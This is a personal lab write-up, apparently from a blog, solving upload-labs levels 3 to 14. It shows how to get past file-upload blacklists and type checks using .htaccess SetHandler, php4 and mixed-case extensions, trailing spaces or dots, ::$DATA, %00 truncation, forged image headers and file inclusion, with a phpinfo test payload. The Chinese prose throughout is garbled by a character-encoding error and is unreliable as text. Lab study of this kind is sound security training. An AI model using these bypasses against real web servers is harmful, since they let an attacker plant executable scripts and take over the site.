æ–‡ä»¶åçš„æç¤ºï¼Œéå¸¸æœ‰ç†ç”±è®¤ä¸ºåå°è®¾ç½®äº†åç¼€çš„é»‘åå•</p><p>å¤§å°å†™ç»•è¿‡ï¼Œæ²¡ç»•è¿‡å»ï¼Œç©ºæ ¼ç»•è¿‡å»äº†ä½†æ˜¯ä¸è§£æï¼Œé‚£æ—¢ç„¶æ˜¯é»‘åå•ï¼Œå°±æŠŠåç¼€æ”¹æˆ php4 å‘—</p><p><img src="upload-labs-03-01.png" alt=""></p><p>ä¸Šèšå‰‘è¿æ¥çš„æ—¶å€™ï¼Œè„šæœ¬æ”¹æˆ php4 ç±»å‹çš„å°±å¯ä»¥äº†</p><h2 id="æ€»ç»“-3"><a class="markdownIt-Anchor" href="#æ€»ç»“-3">#</a> æ€»ç»“</h2><p>æ®è¯´ï¼Œç©ºæ ¼å¯ä»¥é‚£å•¥ï¼Œwindows ä¼šå¿½ç•¥ç©ºæ ¼å’Œç‚¹ï¼Œå¯æ˜¯æˆ‘ä¸Šä¼ æˆåŠŸä¸èƒ½è§£æ</p><p>ç„¶å 00 æˆªæ–­ä¸Šä¼ ï¼Œå³é”®çœ‹æºä»£ç æ˜¯æˆ‘çš„ä¸€å¥è¯ï¼Œåæ¥æŸ¥äº†ä¸€ä¸‹æˆªæ–­ä¸Šä¼ çš„æ¡ä»¶ï¼š</p><ol><li>php ç‰ˆæœ¬å°äº 5.3.29</li><li>magic_quotes_gpc = Off</li></ol><p>å”‰</p><h1 id="pass-04"><a class="markdownIt-Anchor" href="#pass-04">#</a> Pass-04</h1><p>dateï¼š2020-11-25 23:03:25</p><h2 id="è¿‡ç¨‹-4"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-4">#</a> è¿‡ç¨‹</h2><p>æç¤ºï¼š</p><p>æœ¬ pass ç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf åç¼€æ–‡ä»¶ï¼</p><p>çœ‹äº†ä¸‹æºç ç©ºæ ¼å¤§å°å†™å•¥çš„ï¼Œéƒ½è¢«å¼„äº†</p><p>ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤.htaccess åç¼€</p><p>è¦å¯ç”¨.htaccessï¼Œè¦æ›´æ”¹ httpd.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride None </span><br><span class="line">æ›´æ”¹ä¸ºï¼šAllowOverride All</span><br></pre></td></tr></table></figure><p><img src="upload-labs-04-01.png" alt=""></p><p>å»æ‰æ¡†ä½è¿™è¡Œçš„æ³¨é‡Šç¬¦å·</p><p><img src="upload-labs-04-02.png" alt=""></p><p>ä¸Šä¼ .htaccessï¼Œæ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè§£æä¸º php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>ç„¶åä¸Šä¼  hqxx.png å›¾ç‰‡é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é¢˜ç›®ä¹Ÿç»™äº†è·¯å¾„äº†ï¼Œåœ°å€æ ç›´æ¥è¾“å…¥å°±è¡Œ</p><h2 id="æ€»ç»“-4"><a class="markdownIt-Anchor" href="#æ€»ç»“-4">#</a> æ€»ç»“</h2><p>æˆ‘æœ€åä¹Ÿæ²¡æŠŠ.png è§£æ php æˆåŠŸ</p><p>åœ¨.htaccess é‡Œé¢éšä¾¿è¾“é”™è¯¯å­—ç¬¦ï¼ŒæŠ¥ 500ï¼Œå»çœ‹ apache çš„æ—¥å¿—è¯´æˆ‘è¾“å…¥çš„é”™è¯¯å­—ç¬¦ä¸å¯¹ï¼Œè¯´æ˜æˆ‘ä¸Šä¼ çš„.htaccess æ–‡ä»¶æ˜¯è¢«è§£æäº†çš„</p><p>æŠŠ httpd.conf é‡Œé¢æ‰€æœ‰çš„ AllowOverride None éƒ½æ”¹æˆäº† AllowOverride Allï¼Œé‡å†™æ¨¡å—ä¹Ÿå¼€äº†ï¼Œæ–‡ä»¶è·¯å¾„ä¹Ÿæ²¡æœ‰é—®é¢˜ï¼Œphp ç‰ˆæœ¬ä¹Ÿè°ƒä½äº†ï¼Œphpstudy ä¹Ÿé‡å¯äº†ï¼Œä½†æ°¸è¿œå°±æ˜¯è¿™æ ·ï¼š</p><p><img src="upload-labs-04-03.png" alt=""></p><p>æˆ‘è§‰å¾—åº”è¯¥è¿˜æ˜¯é…ç½®æ–‡ä»¶çš„é—®é¢˜ï¼Œå¯æ˜¯åˆ°åº•æ˜¯å“ªé‡Œå‡ºäº†é—®é¢˜å•Šï¼ï¼ï¼</p><p>è€Œåä¿®æ”¹ htaccess ä¸ºï¼ŒæŠŠæ–‡ä»¶ååŒ…å« hqxx çš„æ–‡ä»¶å…¨éƒ¨ä»¥ php è§£æ:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;hqxx&quot; &gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>å‘ç° a.php å¯ä»¥è§£ææˆåŠŸï¼Œè€Œ hqxx.php ä¸èƒ½è§£æï¼Œæˆ‘çœŸçœŸçœŸå‘µå‘µäº†</p><p>æ‰¾äº†å¥½ä¹…ç»ˆäºå‘ç°æœ‰ä¸€ä¸ªäººå’Œæˆ‘ä¸€æ ·çš„é—®é¢˜äº†ï¼Œå“­å”§å”§</p><p><a href="https://www.zhaosimeng.cn/zqzb/55.html">è°¢è°¢å¤§å“¥</a></p><p>åœ¨æ–°ç‰ˆä¸­ php ç¯å¢ƒé»˜è®¤éƒ½æ˜¯å¸¦ nts çš„ï¼Œè€Œåœ¨æ—§ç‰ˆæœ¬ä¸­åˆ™å¯ä»¥é€‰æ‹©ä¸å¸¦ï¼Œé€‰ä¸€ä¸ªä¸å¸¦ nts çš„ php ç‰ˆæœ¬å°±å¯ä»¥æ­£å¸¸ç©äº†ï¼Œä½†æ˜¯æˆ‘çš„ phpstudy é‡Œçš„ php å…¨æ˜¯å¸¦ nts çš„ï¼Œè°¢è°¢æ‚¨äº†</p><ol><li><p><strong>.htaccess ä¸Šä¼ æ¼æ´</strong></p><p>æ¼æ´å½¢æˆæ¡ä»¶</p><ul><li>apache æœåŠ¡å™¨</li><li>èƒ½å¤Ÿä¸Šä¼ .htaccess æ–‡ä»¶ï¼Œä¸€èˆ¬ä¸ºé»‘åå•é™åˆ¶ã€‚</li><li>AllowOverride Allï¼Œé»˜è®¤é…ç½®ä¸ºå…³é—­ Noneã€‚</li><li>LoadModule rewrite_module modules/mod_rewrite.so #æ¨¡å—ä¸ºå¼€å¯çŠ¶æ€</li><li>ä¸Šä¼ ç›®å½•å…·æœ‰å¯æ‰§è¡Œæƒé™ã€‚</li></ul></li><li><p>.htaccess æ–‡ä»¶ (æˆ–è€… &quot;åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶&quot;ï¼‰, å…¨ç§°æ˜¯ Hypertext Access (è¶…æ–‡æœ¬å…¥å£)ã€‚</p><p>æ¦‚è¿°æ¥è¯´ï¼Œhtaccess æ–‡ä»¶æ˜¯<a href="https://baike.baidu.com/item/Apache"> Apache</a> æœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚</p><p>å¯ç”¨.htaccessï¼Œéœ€è¦ä¿®æ”¹ httpd.confï¼Œå¯ç”¨ AllowOverrideï¼Œå¹¶å¯ä»¥ç”¨ AllowOverride é™åˆ¶ç‰¹å®šå‘½ä»¤çš„ä½¿ç”¨ã€‚</p><p>.htaccess çš„ä¸»è¦ä½œç”¨å°±æ˜¯å®ç° url æ”¹å†™ï¼Œä¹Ÿå°±æ˜¯å½“æµè§ˆå™¨é€šè¿‡ url è®¿é—®åˆ°æœåŠ¡å™¨æŸä¸ªæ–‡ä»¶å¤¹æ—¶ï¼Œä½œä¸ºä¸»äººï¼Œæˆ‘ä»¬å¯ä»¥æ¥æ¥å¾…è¿™ä¸ª urlï¼Œå…·ä½“åœ°æ€æ ·æ¥å¾…å®ƒï¼Œå°±æ˜¯æ­¤æ–‡ä»¶çš„ä½œç”¨ã€‚</p><p><a href="https://www.cnblogs.com/gyrgyr/p/10773118.html">.htaccess ä½¿ç”¨æ–¹æ³•ä»‹ç»</a></p></li></ol><h1 id="pass-05"><a class="markdownIt-Anchor" href="#pass-05">#</a> Pass-05</h1><h2 id="è¿‡ç¨‹-5"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-5">#</a> è¿‡ç¨‹</h2><p>çœ‹æºç ï¼Œå·²ç»ä¸è®©ä¸Šä¼ .htaccess äº†ï¼Œä½†æ˜¯è¿™æ¬¡æ²¡æœ‰æŠŠåç¼€åå…¨è½¬æˆå°å†™äº†ï¼Œä¹Ÿå°±æ˜¯è¯´å˜¿å˜¿å˜¿</p><p>ä¸Šä¼  hqxx.phP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æˆåŠŸï¼Œåœ°å€æ ç›´æ¥è¾“å…¥è·¯å¾„</p><p><img src="upload-labs-05-01.png" alt=""></p><h2 id="æ€»ç»“-5"><a class="markdownIt-Anchor" href="#æ€»ç»“-5">#</a> æ€»ç»“</h2><p>æˆ‘æŠŠ apache ç©å´©äº†ï¼Œé‡è£…éƒ½ä¸è¡Œï¼Œæ¢äº† Nginx å“ˆå“ˆå“ˆ</p><p>é¡ºä¾¿æŸ¥äº†ä¸‹ nginx ç”¨ htaccess çš„æ–¹æ³•ï¼Œ<a href="https://blog.csdn.net/cs729298/article/details/77478155">æƒ³çœ‹ç‚¹æˆ‘</a></p><h1 id="pass-06"><a class="markdownIt-Anchor" href="#pass-06">#</a> Pass-06</h1><h2 id="è¿‡ç¨‹-6"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-6">#</a> è¿‡ç¨‹</h2><p>çœ‹æºç ï¼Œä¾ç„¶æ˜¯é»‘åå•</p><p>å¹¶ä¸”å°†åç¼€åå…¨éƒ¨è½¬æ¢ä¸ºå°å†™äº†ï¼Œä½†æ˜¯ç©ºæ ¼å•¥çš„æ²¡å»é™¤äº†</p><p>åœ¨æ–‡ä»¶åæœ«å°¾åŠ ä¸€ä¸ªç©ºæ ¼ä¸Šä¼ </p><p><img src="upload-labs-06-01.png" alt=""></p><p>è§£ææˆåŠŸ</p><p><img src="upload-labs-06-02.png" alt=""></p><h2 id="æ€»ç»“-6"><a class="markdownIt-Anchor" href="#æ€»ç»“-6">#</a> æ€»ç»“</h2><p>åˆ©ç”¨ Windows ç‰¹æ€§ åœ¨ Windows ä¸­æ–‡ä»¶åç¼€åæœ«å°¾æœ‰ç©ºæ ¼ä¼šè‡ªåŠ¨å»æ‰</p><h1 id="pass-07"><a class="markdownIt-Anchor" href="#pass-07">#</a> Pass-07</h1><h2 id="è¿‡ç¨‹-7"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-7">#</a> è¿‡ç¨‹</h2><p>çœ‹æºç ï¼Œè½¬æ¢äº†å¤§å°å†™ï¼Œå»é™¤äº†é¦–ä½ç©ºæ ¼</p><p>é‚£å°±åœ¨æ–‡ä»¶æœ«å°¾åŠ ã€‚å‘—</p><p>ä¸Šä¼ æˆåŠŸï¼Œè§£ææˆåŠŸ</p><p><img src="upload-labs-07-01.png" alt=""></p><h2 id="æ€»ç»“-7"><a class="markdownIt-Anchor" href="#æ€»ç»“-7">#</a> æ€»ç»“</h2><p>ä¸‹ä¸€é¢˜</p><h1 id="pass-08"><a class="markdownIt-Anchor" href="#pass-08">#</a> Pass-08</h1><h2 id="è¿‡ç¨‹-8"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-8">#</a> è¿‡ç¨‹</h2><p>ä¸Šä¼  hqxx.php::DATA</p><p><img src="upload-labs-08-01.png" alt=""></p><h2 id="æ€»ç»“-8"><a class="markdownIt-Anchor" href="#æ€»ç»“-8">#</a> æ€»ç»“</h2><p>åˆ©ç”¨ windows ç‰¹æ€§ï¼š</p><p>å¿…é¡»æ˜¯ windows, å¿…é¡»æ˜¯ php, å¿…é¡»æ˜¯é‚£ä¸ªæºæ–‡ä»¶<br> php åœ¨ window çš„æ—¶å€™å¦‚æœæ–‡ä»¶åååŠ ä¸Š &quot;::$DATA&quot;</p><p>ä¼šæŠŠ &quot;::$DATA&quot; ä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†ï¼Œä¸ä¼šæ£€æµ‹åç¼€å</p><p>ä¸”ä¿æŒ &quot;::$DATA&quot; ä¹‹å‰çš„æ–‡ä»¶å</p><p>ä»–çš„ç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€å</p><p>æ”¹æºä»£ç æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå…¶å®å’Œã€‚ç©ºæ ¼æ˜¯ä¸€æ ·çš„ï¼Œå°±æ˜¯åˆ©ç”¨ windows ç‰¹æ€§ç»•è¿‡é»‘åå•ï¼Œä¸Šä¼ åˆ°æ–‡ä»¶å¤¹æ—¶ï¼Œæ–‡ä»¶åé¢çš„ &quot;::DATAâ€¦&quot; å·²ç»è¢«å»æ‰äº†</p><h1 id="pass-09"><a class="markdownIt-Anchor" href="#pass-09">#</a> Pass-09</h1><h2 id="è¿‡ç¨‹-9"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-9">#</a> è¿‡ç¨‹</h2><p>çœ‹æç¤ºï¼šæœ¬ pass åªå…è®¸ä¸Šä¼ .jpg|.png|.gif åç¼€çš„æ–‡ä»¶ï¼</p><p>çœ‹äº†æºç å‘ç°ï¼Œä½ è¿™ä¸ªéª—å­ï¼Œæ˜æ˜è¿˜æ˜¯é»‘åå•ï¼Œä¸‹æ¬¡ä¸çœ‹æç¤ºäº†</p><p>çœ‹æºç ï¼šå…ˆåˆ é™¤äº†æœ«å°¾çš„ç‚¹ï¼Œç„¶åå»æ‰äº†::$DATAï¼Œåç¼€è½¬æˆäº†å°å†™ï¼Œæœ€åå»é™¤é¦–å°¾ç©ºæ ¼</p><p>é‚£å°± hqxx.php. .</p><p>è¿™æ ·æœ€ååœ¨æœ«å°¾å°±ç•™ä¸‹äº†ä¸€ä¸ªç‚¹ï¼Œä¸Šä¼ æˆåŠŸ</p><p><img src="upload-labs-09-01.png" alt=""></p><h2 id="æ€»ç»“-9"><a class="markdownIt-Anchor" href="#æ€»ç»“-9">#</a> æ€»ç»“</h2><p>è·Ÿç€ä»£ç é€»è¾‘èµ°ï½ï¼Œå¯æ˜¯é»‘ç›’éƒ½çœ‹ä¸åˆ°æºä»£ç å”‰</p><h1 id="pass-10"><a class="markdownIt-Anchor" href="#pass-10">#</a> Pass-10</h1><h2 id="è¿‡ç¨‹-10"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-10">#</a> è¿‡ç¨‹</h2><p>å“ˆå“ˆå“ˆï¼Œæºä»£ç æ³¨é‡Šæ²¡äº†</p><p>å…ˆå»é™¤æ–‡ä»¶åä¸­çš„æ‰€æœ‰ç©ºæ ¼ï¼Œå†æŠŠæ–‡ä»¶åä¸­æ‰€æœ‰åœ¨é»‘åå•ä¸­å­˜åœ¨çš„å­—ç¬¦ç½®ç©º</p><p>é‚£ä¹ˆå°±ï¼ŒåŒå†™ï¼ŒæˆåŠŸç»•è¿‡</p><p><img src="upload-labs-10-01.png" alt=""></p><h2 id="æ€»ç»“-10"><a class="markdownIt-Anchor" href="#æ€»ç»“-10">#</a> æ€»ç»“</h2><p>ä¸‹ä¸€é¢˜</p><h1 id="pass-11"><a class="markdownIt-Anchor" href="#pass-11">#</a> Pass-11</h1><h2 id="è¿‡ç¨‹-11"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-11">#</a> è¿‡ç¨‹</h2><p>è§‚æ‘©æºä»£ç ï¼Œå‘ç°æ˜¯ç™½åå•ï¼Œå…è®¸çš„ç±»å‹æœ‰â€™jpgâ€™,â€˜pngâ€™,â€˜gifâ€™ï¼Œè€Œä¸”è¿˜ç»™æ–‡ä»¶é‡å‘½åäº†</p><p>ä¸Šä¼  php æŠ“åŒ…å‘ç° save_path=â€¦/upload</p><p>æºç ä¸­æ–‡ä»¶ä¿å­˜è·¯å¾„å°±æ˜¯ $img_path = <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><msup><mo stretchy="false">[</mo><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mi>s</mi><mi>a</mi><mi>v</mi><msub><mi>e</mi><mi>p</mi></msub><mi>a</mi><mi>t</mi><msup><mi>h</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo stretchy="false">]</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">.</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>d</mi><mo stretchy="false">(</mo><mn>10</mn><mo separator="true">,</mo><mn>99</mn><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi><mi>d</mi><mi>a</mi><mi>t</mi><mi>e</mi><mo stretchy="false">(</mo><mi mathvariant="normal">&quot;</mi><mi>Y</mi><mi>m</mi><mi>d</mi><mi>H</mi><mi>i</mi><mi>s</mi><mi mathvariant="normal">&quot;</mi><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.038em;vertical-align:-0.286108em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">G</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">s</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mord">.</span><span class="mord">&quot;</span><span class="mord">/</span><span class="mord">&quot;</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">9</span><span class="mord">9</span><span class="mclose">)</span><span class="mord">.</span><span class="mord mathnormal">d</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord">&quot;</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord mathnormal">m</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord">&quot;</span><span class="mclose">)</span><span class="mord">.</span><span class="mord">&quot;</span><span class="mord">.</span><span class="mord">&quot;</span><span class="mord">.</span></span></span></span>file_ext;</p><p>ç”¨ 00 æˆªæ–­ï¼Œåœ¨è·¯å¾„åé¢åŠ ä¸Š hqxx.php%00</p><p><img src="upload-labs-11-01.png" alt=""></p><h2 id="æ€»ç»“-11"><a class="markdownIt-Anchor" href="#æ€»ç»“-11">#</a> æ€»ç»“</h2><p>é€šè¿‡å­—ç¬¦æ‹¼æ¥ï¼Œè¿æ¥è·¯å¾„æ–‡ä»¶åï¼Œåå°å¤„ç†åä¸Šä¼ åˆ° windows æ—¶ï¼Œos çœ‹è§ %00 è‡ªåŠ¨æˆªæ–­</p><p>00 æˆªæ–­çš„å‰ææ¡ä»¶ï¼šPHP ç‰ˆæœ¬å°äº 5.3.4ï¼ŒPHP çš„ magic_quotes_gpc ä¸º OFF çŠ¶æ€</p><p>move_uploaded_file å‡½æ•°çš„åº•å±‚å®ç°ç±»ä¼¼äº C è¯­è¨€ï¼Œé‡åˆ° 0x00 ä¼šæˆªæ–­</p><h1 id="pass-12"><a class="markdownIt-Anchor" href="#pass-12">#</a> Pass-12</h1><h2 id="è¿‡ç¨‹-12"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-12">#</a> è¿‡ç¨‹</h2><p>ä¸Šä¼ æ–‡ä»¶æŠ“åŒ…ï¼Œå‘ç°è·¯å¾„ä¹Ÿåœ¨è¡¨å•ä¸­äº†ï¼Œåœ¨åé¢åŠ ä¸Š /hqxx.php ï¼Œæ³¨æ„åé¢æœ‰ä¸€ä¸ªç©ºæ ¼</p><p><img src="upload-labs-12-01.png" alt=""></p><p>å› ä¸º post è¯·æ±‚æ²¡åŠæ³•è§£æ %00ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ hex ä¸­æ›´æ”¹æ•°æ®åŒ…</p><p>æ‰¾åˆ°å¯¹åº”è¡Œï¼Œä»£è¡¨ç©ºæ ¼çš„ 20ï¼Œæ”¹ä¸º 00</p><p><img src="upload-labs-12-02.png" alt=""></p><p>ä¸Šä¼ æˆåŠŸ</p><p><img src="upload-labs-12-03.png" alt=""></p><h2 id="æ€»ç»“-12"><a class="markdownIt-Anchor" href="#æ€»ç»“-12">#</a> æ€»ç»“</h2><p>ä¸ºå•¥ç½‘ä¸Šæœ‰äººè¯´è¿™æ˜¯äºŒè¿›åˆ¶ä»£ç ï¼Œå¯æ˜¯è¿™æ˜æ˜ä¸æ˜¯äºŒè¿›åˆ¶å•Š</p><p>é€šå¸¸ JPEG/JPG: FF D8 , PNG:89 50ï¼ŒGIF:47 49</p><ol><li>JPEG;.JPE;.JPGï¼Œâ€JPGGraphic Fileâ€</li><li>gifï¼Œâ€GIF 89Aâ€</li><li>zipï¼Œâ€Zip Compressedâ€</li><li>doc;.xls;.xlt;.ppt;.aprï¼Œâ€MS Compound Document v1 or Lotus Approach APRfileâ€</li></ol><h1 id="pass-13"><a class="markdownIt-Anchor" href="#pass-13">#</a> Pass-13</h1><h2 id="è¿‡ç¨‹-13"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-13">#</a> è¿‡ç¨‹</h2><p>æºä»£ç ä¸­è¯»å–æ–‡ä»¶å‰ 2 å­—èŠ‚ï¼Œæ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹æ˜¯å¦å±äº jpgã€png æˆ–è€… gif ç±»å‹</p><p>ç±»å‹åˆ¤æ–­æˆåŠŸåï¼Œè¿˜æ›´æ”¹äº†æ–‡ä»¶å</p><p><img src="upload-labs-13-01.png" alt=""></p><p>è¿™é‡Œç”¨æ–‡ä»¶åŒ…å«æ¥è§£æå›¾ç‰‡é©¬</p><p>æ‰‹åŠ¨åœ¨ upload æ–‡ä»¶å¤¹æ·»åŠ ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„ php</p><p><img src="upload-labs-13-02.png" alt=""></p><p>ç„¶åæµè§ˆå™¨è§£æ</p><p><img src="upload-labs-13-03.png" alt=""></p><h2 id="æ€»ç»“-13"><a class="markdownIt-Anchor" href="#æ€»ç»“-13">#</a> æ€»ç»“</h2><p>unpack () å‡½æ•°ä»äºŒè¿›åˆ¶å­—ç¬¦ä¸²å¯¹æ•°æ®è¿›è¡Œè§£åŒ…ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´æœ¬èº«æ²¡æœ‰æ–‡ä»¶åŒ…å«æ¼æ´çš„è¯è¿™ä¸ªå›¾ç‰‡é©¬æ˜¯æ²¡æœ‰åŠæ³•è§£æçš„ï¼Œå”‰</p><h1 id="pass-14"><a class="markdownIt-Anchor" href="#pass-14">#</a> Pass-14</h1><h2 id="è¿‡ç¨‹-14"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-14">#</a> è¿‡ç¨‹</h2><p>çœ‹æºç ï¼Œæ¢äº†ä¸€ç§æ–¹å¼éªŒè¯ç±»å‹</p><p>getimagesize () è¿™ä¸ªå‡½æ•°åŠŸèƒ½ä¼šå¯¹ç›®æ ‡æ–‡ä»¶çš„ 16 è¿›åˆ¶å»è¿›è¡Œä¸€ä¸ªè¯»å–ï¼Œå»è¯»å–å¤´å‡ ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸æ˜¯ç¬¦åˆå›¾ç‰‡çš„è¦æ±‚çš„</p><p>æ‰€ä»¥è¿˜æ˜¯ä¼ªé€ ä¸€ä¸ªå¤´éƒ¨ä¿¡æ¯ï¼Œä¸Šä¼ å›¾ç‰‡é©¬</p><p><img src="upload-labs-14-01.png" alt=""></p><p>å›¾ç‰‡é©¬çš„åˆ©ç”¨å¯ä»¥ç»“åˆæ–‡ä»¶åŒ…å«ï¼Œè§£ææ¼æ´ç­‰â€¦ åæ­£å°±æ˜¯è¦æŠŠä»–ç”¨ php è§£æå˜›</p><p>æ¯”å¦‚ï¼Œ<a href="https://www.cnblogs.com/renhaoblog/p/12874603.html">nginx è§£ææ¼æ´</a>ï¼Œå’Œç‰ˆæœ¬æ— å…³ï¼Œå±äºç”¨æˆ·é…ç½®ä¸å½“äº§ç”Ÿçš„</p><h2 id="æ€»ç»“-14"><a class="markdownIt-Anchor" href="#æ€»ç»“-14">#</a> æ€»ç»“</h2><p><a href="https://www.runoob.com/php/php-getimagesize.html">èœé¸Ÿæ•™ç¨‹</a></p><p>getimagesize () å‡½æ•°ç”¨äºè·å–å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯ï¼ŒæˆåŠŸè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œå¤±è´¥åˆ™è¿”å› FALSE å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ä¿¡æ¯ã€‚</p><p>å®ä¾‹ 1ï¼šæœ¬åœ°å›¾ç‰‡æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">list($width, $height, $type, $attr) = getimagesize(&quot;runoob-logo.png&quot;);</span><br><span class="line">echo &quot;å®½åº¦ä¸ºï¼š&quot; . $width;</span><br><span class="line">echo &quot;é«˜åº¦ä¸ºï¼š&quot; . $height;</span><br><span class="line">echo &quot;ç±»å‹ä¸ºï¼š&quot; . $attr;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šå®ä¾‹è¾“å‡ºç»“æœä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å®½åº¦ä¸ºï¼š290é«˜åº¦ä¸ºï¼š69ç±»å‹ä¸ºï¼š3å±æ€§ï¼šwidth=&quot;290&quot; 